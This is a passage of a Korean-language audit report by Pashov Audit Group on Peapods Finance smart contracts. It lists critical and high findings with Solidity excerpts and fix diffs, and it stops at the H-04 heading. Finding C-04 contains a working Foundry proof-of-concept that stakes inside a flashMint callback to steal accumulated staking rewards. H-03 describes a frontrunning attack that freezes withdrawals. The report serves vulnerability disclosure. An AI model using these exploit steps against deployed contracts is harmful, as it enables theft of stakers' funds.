# 정보

Pashov Audit Group은 이 분야에서 최고의 스마트 계약 보안 연구원 팀으로 구성되어 있습니다. 총 1000건 이상의 보안 취약점을 보고한 이 그룹은 절대적으로 최고의 감사 여정을 만들기 위해 노력합니다. 100% 보안은 결코 보장할 수 없지만, 경험 많은 연구원들이 귀하의 블록체인 프로토콜을 위해 최선을 다할 것을 보장합니다. 이전 작업은 [여기](https://github.com/pashov/audits)에서 확인하거나 Twitter [@pashovkrum](https://twitter.com/pashovkrum)으로 문의하십시오.

# 면책 조항

스마트 계약 보안 검토는 취약점의 완전한 부재를 보장할 수 없습니다. 이는 시간, 자원 및 전문 지식이 제한된 노력으로, 가능한 한 많은 취약점을 찾으려고 노력합니다. 검토 후 100% 보안을 보장할 수 없으며, 검토를 통해 스마트 계약의 모든 문제를 발견한다고 보장할 수도 없습니다. 후속 보안 검토, 버그 바운티 프로그램 및 온체인 모니터링을 강력히 권장합니다.

# 소개

**peapodsfinance/contracts** 및 **peapodsfinance/fraxlend** 저장소에 대한 시간 제한 보안 검토는 **Pashov Audit Group**에 의해 수행되었으며, 애플리케이션의 스마트 계약 구현 보안 측면에 중점을 두었습니다.

# Peapods 정보

Peapods는 변동성 파밍(Volatility Farming) 개념을 활용합니다. 즉, 암호화폐 가격 변동 및 차익 거래 활동에서 수익을 창출합니다. Pod는 자산을 pTKN 토큰으로 래핑하는 완전히 담보된 금고로, pTKN과 TKN 사이에 가격 편차를 생성하여 시장 참여자에게 차익 거래 기회를 제공합니다. 각 금고에 대한 인센티브 유동성 풀은 충분한 거래 가능성을 보장하고, 수익의 일부를 참여자에게 분배하며, 유동성 제공자에게 PEAS 토큰을 영구적으로 보상합니다.

# 위험 분류

| 심각도 | 영향: 높음 | 영향: 중간 | 영향: 낮음 |
| --- | --- | --- | --- |
| **가능성: 높음** | 치명적 | 높음 | 중간 |
| **가능성: 중간** | 높음 | 중간 | 낮음 |
| **가능성: 낮음** | 중간 | 낮음 | 낮음 |

## 영향

- 높음 - 프로토콜의 자산에 상당한 물질적 손실을 초래하거나 사용자 그룹에 상당한 피해를 줍니다.

- 중간 - 프로토콜의 자산에 중간 정도의 물질적 손실을 초래하거나 사용자 그룹에 중간 정도의 피해를 줍니다.

- 낮음 - 프로토콜의 자산에 경미한 물질적 손실을 초래하거나 소수의 사용자 그룹에 피해를 줍니다.

## 가능성

- 높음 - 온체인 조건을 모방한 합리적인 가정 하에 공격 경로가 가능하며, 도난당하거나 손실될 수 있는 자금의 양에 비해 공격 비용이 상대적으로 낮습니다.

- 중간 - 조건부로 인센티브가 주어지는 공격 벡터이지만 여전히 상대적으로 가능성이 높습니다.

- 낮음 - 가정이 너무 많거나 가능성이 희박하거나 공격자가 인센티브가 거의 없거나 전혀 없이 상당한 지분을 투자해야 합니다.

## 심각도 수준에 따른 조치 필요

- 치명적 - 가능한 한 빨리 수정해야 함(이미 배포된 경우).

- 높음 - 수정해야 함(아직 배포되지 않은 경우 배포 전).

- 중간 - 수정해야 함.

- 낮음 - 수정할 수 있음.

# 보안 평가 요약

_검토 커밋 해시_

- [dccf7ce1df4cff8c3800ffb284afe644813e128f](https://github.com/peapodsfinance/contracts/tree/dccf7ce1df4cff8c3800ffb284afe644813e128f)
- [b6447b1e9d2a0154a61332a80e538b6a72a7d021](https://github.com/peapodsfinance/fraxlend/tree/b6447b1e9d2a0154a61332a80e538b6a72a7d021)

_수정 검토 커밋 해시_

- [53ac7647c3b64fc8a757145de68ee677510009f5](https://github.com/peapodsfinance/contracts/tree/53ac7647c3b64fc8a757145de68ee677510009f5)
- [0e6aac7e30f0bc407ed25aa25fe243246b9286ed](https://github.com/peapodsfinance/fraxlend/tree/0e6aac7e30f0bc407ed25aa25fe243246b9286ed)

### 범위

다음 스마트 계약이 감사 범위에 포함되었습니다.

```
- TokenBridge
- TokenRouter
- AerodromeDexAdapter
- CamelotDexAdapter
- UniswapDexAdapter
- BalancerFlashSource
- FlashSourceBase
- PodFlashSource
- UniswapV3FlashSource
- AerodromeCommands
- BokkyPooBahsDateTimeLibrary
- FullMath
- PoolAddress
- PoolAddressAlgebra
- PoolAddressKimMode
- PoolAddressSlipstream
- TickMath
- VaultAccount
- LeverageManager
- LeverageManagerAccessControl
- LeveragePositionCustodian
- LeveragePositions
- ChainlinkSinglePriceOracle
- DIAOracleV2SinglePriceOracle
- UniswapV3SinglePriceOracle
- V2ReservesCamelot
- V2ReservesUniswap
- aspTKNMinimalOracle
- spTKNMinimalOracle
- V3TwapAerodromeUtilities
- V3TwapCamelotUtilities
- V3TwapKimUtilities
```

```
- V3TwapUtilities
- ConversionFactorPTKN
- ConversionFactorSPTKN
- VotingPool
- AutoCompoundingPodLp
- AutoCompoundingPodLpFactory
- BulkPodYieldProcess
- DecentralizedIndex
- ERC20Bridgeable
- IndexManager
- IndexUtils
- LendingAssetVault
- LendingAssetVaultFactory
- PEAS
- ProtocolFeeRouter
- ProtocolFees
- RewardsWhitelist
- StakingPoolToken
- TokenRewards
- V3Locker
- WeightedIndex
- Zapper
```

# 발견 사항

# [C-01] 현물 가격 사용으로 인한 가격 조작 공격 가능성

## 심각도

**영향:** 높음

**가능성:** 높음

## 설명

V3TwapKimUtilities.sol 계약에서 `_sqrtPriceX96FromPoolAndInterval` 메서드는 풀의 전역 상태에서 현물 가격을 검색합니다. 이 접근 방식은 현물 가격이 악의적인 행위자에 의해 영향을 받을 수 있으므로 가격 조작에 취약하여 잠재적인 악용으로 이어질 수 있습니다.

```solidity
    function _sqrtPriceX96FromPoolAndInterval(address _poolAddress) internal view returns (uint160 sqrtPriceX96) {
        IAlgebraKimV3Pool _pool = IAlgebraKimV3Pool(_poolAddress);
        // TODO: find and use tickCumulative method
        (sqrtPriceX96,,,,,) = _pool.globalState();
    }
```

## 권장 사항

이 위험을 완화하려면 AlgebraBasePluginV1의 `getTimepoints` 메서드를 사용하는 것이 좋습니다. 이 메서드는 가격 데이터를 얻는 더 강력하고 안전한 방법을 제공하여 조작 가능성을 줄일 수 있습니다. 자세한 내용은 [여기](https://github.com/cryptoalgebra/Algebra/blob/839ceaa768f987cd5d97c6d3312f8442035f96c4/src/plugin/contracts/AlgebraBasePluginV1.sol#L123)에서 확인할 수 있습니다.

# [C-02] 자체 대출 쌍의 경우 보상이 갇힘

## 심각도

**영향:** 높음

**가능성:** 높음

## 설명

자체 대출(self-lending) 포드의 경우 포드의 쌍 LP 토큰은 대출 쌍의 지분인 fToken입니다.

`AutoCompoundingPodLp`에서는 보상 토큰을 쌍 LP 토큰으로 변환합니다. 그러나 자체 대출 포드의 경우 fToken으로 변환하는 대신 더 유동적인 자산이므로 기본 토큰으로 변환합니다. (나중에 자산을 대출 쌍에 예치하여 fToken을 받을 의도로)

```solidity
// if self lending pod, we need to swap for the lending pair borrow token,
// then deposit into the lending pair which is the paired LP token for the pod
if (IS_PAIRED_LENDING_PAIR) {
    _swapOutputTkn = IFraxlendPair(_pairedLpToken).asset();
}
```

보상 토큰이 포드의 LP 보상 토큰과 동일한 경우 올바르게 처리됩니다.

```solidity
try DEX_ADAPTER.swapV3Single(
    /* PARAMS */
) returns (uint256 __amountOut) {
    ...
    // if this is a self-lending pod, convert the received borrow token
    // into fTKN shares and use as the output since it's the pod paired LP token
    if (IS_PAIRED_LENDING_PAIR) {
        IERC20(_swapOutputTkn).safeIncreaseAllowance(address(_pairedLpToken), _amountOut);
        _amountOut = IFraxlendPair(_pairedLpToken).deposit(_amountOut, address(this));
    }
}
```

그러나 보상 토큰이 포드의 LP 보상 토큰과 같지 않으면 예치가 발생하지 않습니다.

```solidity
address _rewardsToken = pod.lpRewardsToken();
if (_token != _rewardsToken) {
    return _swap(_token, _swapOutputTkn, _amountIn, 0); //@audit only swap occurs to token, not converting to fToken!
}
```

결과적으로 `_processRewardsToPodLp()` 내의 이후 스왑은 포드의 실제 쌍 LP 토큰인 fToken의 잔액이 0이기 때문에 실패합니다(try-catch로 인해 되돌리지는 않음).

fToken의 기본 토큰은 aspTKN 계약에 갇혀 상환할 수 없으므로 보상이 손실됩니다.

## 개념 증명

PoC는 여러 파일이 있는 대규모 설정이 필요하므로 [여기](https://gist.github.com/0xjuaan/0567324d0dd7e36f29bf0ea809389b1c)에 gist를 추가했습니다.

`.env` 파일에 메인넷 RPC URL이 필요합니다. `RPC="<insert-url>"`

## 권장 사항

`_tokenToPairedLpToken()` 내에서 `_token != _rewardsToken`일 때 반환하기 전에 기본 자산을 대출 쌍에 예치하십시오.

# [C-03] `_removeLeverage`가 대출 쌍 증서를 상환할 때 잘못된 금액을 사용함

## 심각도

**영향:** 높음

**가능성:** 높음

## 설명

사용자가 포지션에서 레버리지를 제거하거나 줄일 때 `_pairedAmtReceived`가 `_repayAmount`보다 낮으면 `_userProvidedDebtAmtMax`에서 나머지 토큰을 가져오려고 시도하거나, `_userProvidedDebtAmtMax`가 제공되지 않으면 `_repayAmount`를 충당하기에 충분할 때까지 `_podAmtReceived`를 상환 토큰으로 교환합니다.

```solidity
    function _acquireBorrowTokenForRepayment(
        LeverageFlashProps memory _props,
        address _pod,
        address _borrowToken,
        uint256 _repayAmount,
        uint256 _pairedAmtReceived,
        uint256 _podAmtReceived,
        uint256 _userProvidedDebtAmtMax
    ) internal returns (uint256 _podAmtRemaining) {
        _podAmtRemaining = _podAmtReceived;
        uint256 _borrowNeeded = _repayAmount - _pairedAmtReceived;
        uint256 _borrowAmtNeededToSwap = _borrowNeeded;
        if (_userProvidedDebtAmtMax > 0) {
            uint256 _borrowAmtFromUser =
                _userProvidedDebtAmtMax >= _borrowNeeded ? _borrowNeeded : _userProvidedDebtAmtMax;
            _borrowAmtNeededToSwap -= _borrowAmtFromUser;
            IERC20(_borrowToken).safeTransferFrom(_props.user, address(this), _borrowAmtFromUser);
        }
        // sell pod token into LP for enough borrow token to get enough to repay
        // if self-lending swap for lending pair then redeem for borrow token
        if (_borrowAmtNeededToSwap > 0) {
            if (_isPodSelfLending(_props.positionId)) {
>>>             _podAmtRemaining = _swapPodForBorrowToken(
                    _pod, positionProps[_props.positionId].lendingPair, _podAmtReceived, _borrowAmtNeededToSwap
                );
>>>             _podAmtRemaining = IFraxlendPair(positionProps[_props.positionId].lendingPair).redeem(
                    _podAmtRemaining, address(this), address(this)
                );
            } else {
                _podAmtRemaining = _swapPodForBorrowToken(_pod, _borrowToken, _podAmtReceived, _borrowAmtNeededToSwap);
            }
        }
    }
```

```solidity
    function _swapPodForBorrowToken(address _pod, address _targetToken, uint256 _podAmt, uint256 _targetNeededAmt)
        internal
        returns (uint256 _podRemainingAmt)
    {
        IDexAdapter _dexAdapter = IDecentralizedIndex(_pod).DEX_HANDLER();
        uint256 _balBefore = IERC20(_pod).balanceOf(address(this));
        IERC20(_pod).safeIncreaseAllowance(address(_dexAdapter), _podAmt);
        _dexAdapter.swapV2SingleExactOut(_pod, _targetToken, _podAmt, _targetNeededAmt, address(this));
        _podRemainingAmt = _podAmt - (_balBefore - IERC20(_pod).balanceOf(address(this)));
    }
```

`_acquireBorrowTokenForRepayment`는 `_swapPodForBorrowToken`을 호출하여 포드를 `lendingPair`로 교환한 다음 `redeem`을 호출하여 교환된 대출 쌍을 상환합니다. 그러나 수령한 대출 쌍 토큰 대신 `_podAmtRemaining`을 `redeem` 함수에 잘못 제공합니다.

또한 `_podAmtRemaining`을 `redeem` 함수의 반환 값으로 불필요하게 업데이트하여 `_podAmtRemaining`이 남은 포드 토큰 금액 대신 상환된 대출 토큰 금액을 반영하게 합니다.

결과적으로 자체 대출 포드가 있는 포지션은 잘못된 금액이 사용되어 호출이 되돌려지므로 `_acquireBorrowTokenForRepayment` 메커니즘을 사용하여 레버리지 포지션을 줄이거나 제거할 수 없습니다.

## 권장 사항

함수를 다음과 같이 업데이트하십시오.

```diff
    function _acquireBorrowTokenForRepayment(
        LeverageFlashProps memory _props,
        address _pod,
        address _borrowToken,
        uint256 _repayAmount,
        uint256 _pairedAmtReceived,
        uint256 _podAmtReceived,
        uint256 _userProvidedDebtAmtMax
    ) internal returns (uint256 _podAmtRemaining) {
        _podAmtRemaining = _podAmtReceived;
        uint256 _borrowNeeded = _repayAmount - _pairedAmtReceived;
        uint256 _borrowAmtNeededToSwap = _borrowNeeded;
        if (_userProvidedDebtAmtMax > 0) {
            uint256 _borrowAmtFromUser =
                _userProvidedDebtAmtMax >= _borrowNeeded ? _borrowNeeded : _userProvidedDebtAmtMax;
            _borrowAmtNeededToSwap -= _borrowAmtFromUser;
            IERC20(_borrowToken).safeTransferFrom(_props.user, address(this), _borrowAmtFromUser);
        }
        // sell pod token into LP for enough borrow token to get enough to repay
        // if self-lending swap for lending pair then redeem for borrow token
        if (_borrowAmtNeededToSwap > 0) {
            if (_isPodSelfLending(_props.positionId)) {
                _podAmtRemaining = _swapPodForBorrowToken(
                    _pod, positionProps[_props.positionId].lendingPair, _podAmtReceived, _borrowAmtNeededToSwap
                );
+               uint256 redeemAmount = IERC20(positionProps[_props.positionId].lendingPair).balanceOf(address(this));
-               _podAmtRemaining = IFraxlendPair(positionProps[_props.positionId].lendingPair).redeem(
-                   _podAmtRemaining, address(this), address(this)
-               );
+               IFraxlendPair(positionProps[_props.positionId].lendingPair).redeem(
+                   redeemAmount, address(this), address(this)
+               );
            } else {
                _podAmtRemaining = _swapPodForBorrowToken(_pod, _borrowToken, _podAmtReceived, _borrowAmtNeededToSwap);
            }
        }
    }
```

# [C-04] 공격자가 스테이킹 보상을 훔칠 수 있음

## 심각도

**영향:** 높음

**가능성:** 높음

## 설명

`flashMint`가 호출되면 `_shortCircuitRewards`를 1로 설정하여 `_processPreSwapFeesAndSwap`이 실행되지 않도록 합니다. 결과적으로 징수된 수수료는 교환되지 않으며 스테이킹 풀의 `POOL_REWARDS`에도 예치되지 않습니다.

```solidity
    function flashMint(address _recipient, uint256 _amount, bytes calldata _data) external override lock {
>>>     _shortCircuitRewards = 1;
        uint256 _fee = _amount / 1000;
        _mint(_recipient, _amount);
        IFlashLoanRecipient(_recipient).callback(_data);
        // Make sure the calling user pays fee of 0.1% more than they flash minted to recipient
        _burn(_recipient, _amount);
        // only adjust _totalSupply by fee amt since we didn't add to supply at mint during flash mint
        _totalSupply -= _fee == 0 ? 1 : _fee;
        _burn(_msgSender(), _fee == 0 ? 1 : _fee);
        _shortCircuitRewards = 0;
        emit FlashMint(_msgSender(), _recipient, _amount);
    }
```

```solidity
    function _processPreSwapFeesAndSwap() internal {
>>>     if (_shortCircuitRewards == 1) {
            return;
        }
        // SWAP_DELAY = 20;
        bool _passesSwapDelay = block.timestamp > _lastSwap + SWAP_DELAY;
        if (!_passesSwapDelay) {
            return;
        }
        uint256 _bal = balanceOf(address(this));
        if (_bal == 0) {
            return;
        }
        uint256 _lpBal = balanceOf(V2_POOL);
        uint256 _min = block.chainid == 1 ? _lpBal / 1000 : _lpBal / 4000; // 0.1%/0.025% LP bal
        uint256 _max = _lpBal / 100; // 1%
        if (_bal >= _min && _lpBal > 0) {
            _swapping = 1;
            _lastSwap = uint64(block.timestamp);
            uint256 _totalAmt = _bal > _max ? _max : _bal;
            uint256 _partnerAmt;
            if (fees.partner > 0 && config.partner != address(0) && !_blacklist[config.partner]) {
                _partnerAmt = (_totalAmt * fees.partner) / DEN;
                super._transfer(address(this), config.partner, _partnerAmt);
            }
            _feeSwap(_totalAmt - _partnerAmt);
            _swapping = 0;
        }
    }
```

공격자는 `flashMint` 콜백 내에서 포드의 V2 풀 토큰을 `StakingPoolToken`에 스테이킹하여 이를 악용할 수 있습니다. 사용자가 V2 풀 토큰을 `StakingPoolToken`에 스테이킹하면 `POOL_REWARDS`에서 지분 추적이 업데이트됩니다.

```solidity
    function _afterTokenTransfer(address _from, address _to, uint256 _amount) internal override {
        if (_from != address(0)) {
            TokenRewards(POOL_REWARDS).setShares(_from, _amount, true);
        }
        if (_to != address(0) && _to != address(0xdead)) {
            TokenRewards(POOL_REWARDS).setShares(_to, _amount, false);
        }
    }
```

`POOL_REWARDS.setShares`가 호출되면 `_processFeesIfApplicable` 트리거를 시도합니다. 이는 포드에 누적된 수수료를 처리하여 새로운 스테이커가 이전에 누적된 수수료로 즉각적인 이익을 얻을 수 없도록 합니다.

```solidity
    function setShares(address _wallet, uint256 _amount, bool _sharesRemoving) external override {
        require(_msgSender() == trackingToken, "UNAUTHORIZED");
        _setShares(_wallet, _amount, _sharesRemoving);
    }

    function _setShares(address _wallet, uint256 _amount, bool _sharesRemoving) internal {
>>>     _processFeesIfApplicable();
        if (_sharesRemoving) {
            _removeShares(_wallet, _amount);
            emit RemoveShares(_wallet, _amount);
        } else {
            _addShares(_wallet, _amount);
            emit AddShares(_wallet, _amount);
        }
    }
```

그러나 `flashMint` 콜백 내에서 `stake`가 호출되면 `_shortCircuitRewards`가 1로 설정되어 수수료 교환 및 `POOL_REWARDS`로의 보상 예치가 방지됩니다.

공격자가 `flashMint` 콜백 내에서 `stake`를 하고 `flashMint` 프로세스를 종료한 후, 즉시 `unstake`를 호출하여 `_processFeesIfApplicable`을 트리거하고 보상을 훔쳐 즉각적인 이익을 얻을 수 있습니다.

PoC :

`IndexUtils.t.sol`에 다음 테스트를 추가하십시오.

```solidity
    function test_ReentrancyFlashMint() public {
        // Get a pod to test with
        address podToDup = IStakingPoolToken(0x4D57ad8FB14311e1Fc4b3fcaC62129506FF373b1).indexFund(); // spPDAI
        address newPod = _dupPodAndSeedLp(podToDup, address(0), 0, 0);
        IDecentralizedIndex indexFund = IDecentralizedIndex(newPod);

        // Setup test amounts
        uint256 podTokensToAdd = 1e18;
        uint256 pairedTokensToAdd = 1e18;
        uint256 slippage = 1000; // 100% slippage for test

        // Deal tokens to this contract
        deal(peas, address(this), podTokensToAdd + 1000);
        // attacker balance before
        uint256 peasBefore = IERC20(peas).balanceOf(address(this));
        IERC20(peas).approve(address(indexFund), podTokensToAdd + 1000);
        uint256 podBef = indexFund.balanceOf(address(this));
        indexFund.bond(peas, podTokensToAdd + 1000, 0);
        uint256 pTknToLp = indexFund.balanceOf(address(this)) - podBef - 10;
        deal(indexFund.PAIRED_LP_TOKEN(), address(this), pairedTokensToAdd);

        uint256 initialPairedBalance = IERC20(indexFund.PAIRED_LP_TOKEN()).balanceOf(address(this));

        // Approve tokens
        // IERC20(address(indexFund)).approve(address(indexFund), pTknToLp);
        IERC20(indexFund.PAIRED_LP_TOKEN()).approve(address(indexFund), pairedTokensToAdd);

        uint256 lpAmount = indexFund.addLiquidityV2(pTknToLp,pairedTokensToAdd,1000,block.timestamp);


        // Get initial staked LP balance
        address stakingPool = indexFund.lpStakingPool();

        // Deal tokens to the indexFund to simulate accumulated reward fees
        deal(address(indexFund), address(indexFund), 100e18);

        // function flashMint(address _recipient, uint256 _amount, bytes calldata _data) external override lock
        bytes memory data = abi.encode(indexFund, stakingPool, lpAmount);
        indexFund.flashMint(address(this), 0, data);

        IStakingPoolToken(stakingPool).unstake(lpAmount);

        address _podV2Pool = IStakingPoolToken(stakingPool).stakingToken();
        IERC20(_podV2Pool).approve(address(indexFund), lpAmount);
        indexFund.removeLiquidityV2(lpAmount,0,0,block.timestamp);
        address[] memory _tokens = new address[](1);
        uint8[] memory _percentages = new uint8[](1);
        indexFund.debond(IERC20(address(indexFund)).balanceOf(address(this)),_tokens, _percentages);

        uint256 peasAfter = IERC20(peas).balanceOf(address(this));
        uint256 PairedBalanceAfter = IERC20(indexFund.PAIRED_LP_TOKEN()).balanceOf(address(this));
        console.log("initial peas : ");
        console.log(peasBefore);
        console.log("after peas : ");
        console.log(peasAfter);
        console.log("initial paired : ");
        console.log(initialPairedBalance);
        console.log("after paired : ");
        console.log(PairedBalanceAfter);
    }

    function callback(bytes calldata data) external {
        (address indexFund, address stakingPool, uint256 lpAmount) = abi.decode(data, (address, address, uint256));
        address _podV2Pool = IStakingPoolToken(stakingPool).stakingToken();
        IERC20(_podV2Pool).approve(stakingPool, lpAmount);
        IStakingPoolToken(stakingPool).stake(address(this), lpAmount);
    }
```

테스트 실행:

```
forge test --match-test test_ReentrancyFlashMint --fork-url https://eth-mainnet.alchemyapi.io/v2/API_KEY
```

로그 출력:

```
Logs:
  initial peas :
  1000000000000001000
  after peas :
  49853312988018152980

  initial paired :
  1000000000000000000
  after paired :
  990372833280884832
```

`_processPreSwapFeesAndSwap`은 일정 최소 수수료가 누적되고 스왑 지연이 적용될 때까지 트리거되지 않는다는 점을 고려할 때, 공격자가 훔칠 수 있는 상당한 양의 수수료가 포드에 있을 가능성이 높습니다.

## 권장 사항

`DecentralizedIndex.processPreSwapFeesAndSwap`에 `lock` 수정자를 추가하여 `flashMint` 콜백 내에서의 스테이킹을 방지하십시오.

```diff
-    function processPreSwapFeesAndSwap() external override {
+    function processPreSwapFeesAndSwap() external override lock {
        require(_msgSender() == StakingPoolToken(lpStakingPool).POOL_REWARDS(), "R");
        _processPreSwapFeesAndSwap();
    }
```

# [C-05] `removeLeverage`가 사용자에게 잘못된 토큰을 전송하려고 시도함

## 심각도

**영향:** 높음

**가능성:** 높음

## 설명

`removeLeverage`가 호출되고 포지션이 자체 대출 포드를 사용하는 경우, LP 언스테이크 및 제거 프로세스에서 얻은 `_pairedAmtReceived`가 자체 대출 포드에서 래핑 해제됩니다. 그런 다음 수령한 대출 쌍의 지분을 상환하여 기본 차입 토큰을 획득합니다.

```solidity
    function _removeLeverage(bytes memory _userData)
        internal
        returns (uint256 _podAmtRemaining, uint256 _borrowAmtRemaining)
    {
        // ...

        LeveragePositionProps memory _posProps = positionProps[_props.positionId];

        // allowance increases for _borrowAssetAmt prior to flash loaning asset
        IFraxlendPair(_posProps.lendingPair).repayAsset(_borrowSharesToRepay, _posProps.custodian);
        LeveragePositionCustodian(_posProps.custodian).removeCollateral(
            _posProps.lendingPair, _collateralAssetRemoveAmt, address(this)
        );
>>>     (uint256 _podAmtReceived, uint256 _pairedAmtReceived) = _unstakeAndRemoveLP(
            _props.positionId, _posProps.pod, _collateralAssetRemoveAmt, _podAmtMin, _pairedAssetAmtMin
        );
        _podAmtRemaining = _podAmtReceived;

        // redeem borrow asset from lending pair for self lending positions
        if (_isPodSelfLending(_props.positionId)) {
            // unwrap from self lending pod for lending pair asset
            if (_posProps.selfLendingPod != address(0)) {
>>>             _pairedAmtReceived = _debondFromSelfLendingPod(_posProps.selfLendingPod, _pairedAmtReceived);
            }

>>>         IFraxlendPair(_posProps.lendingPair).redeem(_pairedAmtReceived, address(this), address(this));
>>>         _pairedAmtReceived = IERC20(_d.token).balanceOf(address(this));
        }

        // ...
    }
```

그러나 기본 차입 토큰 대신 포드의 `PAIRED_LP_TOKEN`을 사용자에게 전송하려고 시도합니다. 이는 `PAIRED_LP_TOKEN`이 차입 토큰과 동일하다고 가정하는 것인데, 자체 대출 포드를 사용할 때는 그렇지 않습니다.

```solidity
    function callback(bytes memory _userData) external override workflow(false) {
        IFlashLoanSource.FlashData memory _d = abi.decode(_userData, (IFlashLoanSource.FlashData));
        (LeverageFlashProps memory _posProps,) = abi.decode(_d.data, (LeverageFlashProps, bytes));
        address _pod = positionProps[_posProps.positionId].pod;

        require(_getFlashSource(_posProps.positionId) == _msgSender(), "AUTH");

        if (_posProps.method == FlashCallbackMethod.ADD) {
            uint256 _ptknRefundAmt = _addLeverage(_userData);
            if (_ptknRefundAmt > 0) {
                IERC20(_pod).safeTransfer(_posProps.user, _ptknRefundAmt);
            }
        } else if (_posProps.method == FlashCallbackMethod.REMOVE) {
            (uint256 _ptknToUserAmt, uint256 _pairedLpToUser) = _removeLeverage(_userData);
            if (_ptknToUserAmt > 0) {
                // if there's a close fee send returned pod tokens for fee to protocol
                if (closeFeePerc > 0) {
                    uint256 _closeFeeAmt = (_ptknToUserAmt * closeFeePerc) / 1000;
                    IERC20(_pod).safeTransfer(owner(), _closeFeeAmt);
                    _ptknToUserAmt -= _closeFeeAmt;
                }
                // @audit - is user correct here? not owner?
                IERC20(_pod).safeTransfer(_posProps.user, _ptknToUserAmt);
            }
            if (_pairedLpToUser > 0) {
>>>             IERC20(IDecentralizedIndex(_pod).PAIRED_LP_TOKEN()).safeTransfer(_posProps.user, _pairedLpToUser);
            }
        } else {
            require(false, "NI");
        }
    }
```

이로 인해 자체 대출 포드를 사용하는 포지션을 가진 사용자가 포지션을 닫지 못하고 호출이 되돌려집니다.

## 권장 사항

`PAIRED_LP_TOKEN` 대신 차입 토큰을 전송하십시오.

```diff
        } else if (_posProps.method == FlashCallbackMethod.REMOVE) {
            (uint256 _ptknToUserAmt, uint256 _pairedLpToUser) = _removeLeverage(_userData);
            if (_ptknToUserAmt > 0) {
                // if there's a close fee send returned pod tokens for fee to protocol
                if (closeFeePerc > 0) {
                    uint256 _closeFeeAmt = (_ptknToUserAmt * closeFeePerc) / 1000;
                    IERC20(_pod).safeTransfer(owner(), _closeFeeAmt);
                    _ptknToUserAmt -= _closeFeeAmt;
                }
                // @audit - is user correct here? not owner?
                IERC20(_pod).safeTransfer(_posProps.user, _ptknToUserAmt);
            }
            if (_pairedLpToUser > 0) {
-                IERC20(IDecentralizedIndex(_pod).PAIRED_LP_TOKEN()).safeTransfer(_posProps.user, _pairedLpToUser);
+                IERC20(_getBorrowTknForPod(_posProps.positionId)).safeTransfer(_posProps.user, _pairedLpToUser);
            }
        }
```

# [H-01] Metavault의 결함 있는 위험 할당 메커니즘

## 심각도

**영향:** 높음

**가능성:** 중간

## 설명

Metavault(LendingAssetVault)는 공급하는 각 대출 금고에 대해 최대 할당 메커니즘을 구현합니다. 이는 대출 금고가 손상된 상황에서 최대 손실을 잘 정의하고 제한하기 위한 것입니다.

그러나 이 메커니즘의 결함으로 인해 손상된 대출 금고가 Metavault의 모든 자금을 훔쳐 설정된 최대 할당을 초과할 수 있습니다.

최대 위험 할당 메커니즘은 `vaultUtilization[_vault]`가 `vaultMaxAllocation[_vault]`를 초과할 수 없도록 하여 작동합니다.

그러나 `vaultUtilization[_vault]`는 금고의 지분/자산 비율에 따라 달라집니다. 즉, 풀에서 많은 양의 부실 부채가 발생하면(대출 쌍 지분의 가치가 낮아짐) `vaultUtilization[_vault]`가 감소하여 금고가 Metavault에서 더 많은 자금을 끌어올 수 있습니다.

이로 인해 `vaultUtilization[_vault]`에 반영되지 않더라도 금고에서 인출된 총 자금이 `vaultMaxAllocation[_vault]`를 초과할 수 있습니다.

## 권장 사항

대출 금고 지분의 가치에 따라 변경하는 대신 금고에 제공된 토큰 수를 기반으로 `vaultUtilization[_vault]`를 업데이트하는 것이 좋습니다.

# [H-02] AutoCompoundingPodLp의 수수료 손실 가능성

## 심각도

**영향:** 중간

**가능성:** 높음

## 설명

`AutoCompoundingPodLp`에서 보상이 처리될 때 프로토콜 수수료가 부과됩니다.

```solidity
uint256 _pairedFee = (_pairedOut * protocolFee) / 1000;
if (_pairedFee > 0) {
    _protocolFees += _pairedFee;
    _pairedOut -= _pairedFee;
}
```

수수료 토큰은 계약 밖으로 전송되지 않고 계약에 저장됩니다. 그러나 이는 보상 토큰이 쌍 LP 토큰인 경우 계약의 잔액을 확인하여 보상 금액을 계산하기 때문에 이러한 수수료가 사용자에게 자동 복리됨을 의미합니다.

```solidity
address _token = _i == _tokens.length ? pod.lpRewardsToken() : _tokens[_i];
uint256 _bal = IERC20(_token).balanceOf(address(this));
if (_bal == 0) {
    continue;
}
uint256 _newLp = _tokenToPodLp(_token, _bal, 0, _deadline);
_lpAmtOut += _newLp;
```

## 권장 사항

프로토콜 수수료가 나중에 스테이킹된 LP 토큰으로 변환되는 것을 방지하기 위해 수수료 수령자 주소로 전송하는 것이 좋습니다.

# [H-03] MetaVault의 예금을 무기한 동결

## 심각도

**영향:** 높음

**가능성:** 중간

## 설명

다음을 고려하십시오 -->

1.) 피해자가 LendingAssetVault.sol(우리가 Meta Vault라고 부르는 것)에 입금했습니다. 피해자가 입금했을 때

block.number = 50 즉, `_lastDeposit[victim] = 50`

2.) 이제 블록 80에서 피해자가 출금을 원하여 인출하려는 자산을 제공하는 출금 함수를 호출합니다.

3.) 공격자는 멤풀에서 이 tx를 보고 피해자의 출금 호출보다 먼저 실행되도록(frontrun) 1 wei의 자산만으로 입금 함수를 호출합니다.

(또는 증서가 0이 아니도록 하는 데 필요한 최소 금액) 그리고 피해자의 주소를 수신자 주소로 설정합니다 -->

```solidity

function deposit(uint256 _assets, address _receiver) external override returns (uint256 _shares) {
        _updateInterestAndMdInAllVaults(address(0));
        _shares = convertToShares(_assets);
        _deposit(_assets, _shares, _receiver);
    }
```

이것은 여기서 피해자의 `_lastDeposit[victim]`을 80으로 업데이트합니다 -->

```solidity
function _deposit(uint256 _assets, uint256 _shares, address _receiver) internal {
        require(_assets != 0 && _shares != 0, "M");
        _totalAssets += _assets;
        _lastDeposit[_receiver] = block.number; <-- here
        _mint(_receiver, _shares);
        IERC20(_asset).safeTransferFrom(_msgSender(), address(this), _assets);
        emit Deposit(_msgSender(), _receiver, _assets, _shares);
    }
```

4.) 이제 피해자의 출금 tx가 실행되면 `_withdraw` 호출의 이 검사로 인해 되돌려집니다 -->

` require(!_lastDepEnabled || block.number > _lastDeposit[_owner], "MIN");`

LendingAssetVault.sol의 L178

따라서 공격자가 이 프런트러닝을 수행하는 한 피해자는 금고에서 자산을 인출할 수 없으며 이는 해당 자산의 영구적인 동결을 의미합니다.

## 권장 사항

다른 사람을 대신하여 입금하는 것을 허용하지 않는 것이 좋습니다.

# [H-04] 공격자가 증서 가치를 대규모로 부풀릴 수 있음

## 심각도

**영향:** 높음

**가능성:** 중간

## 설명

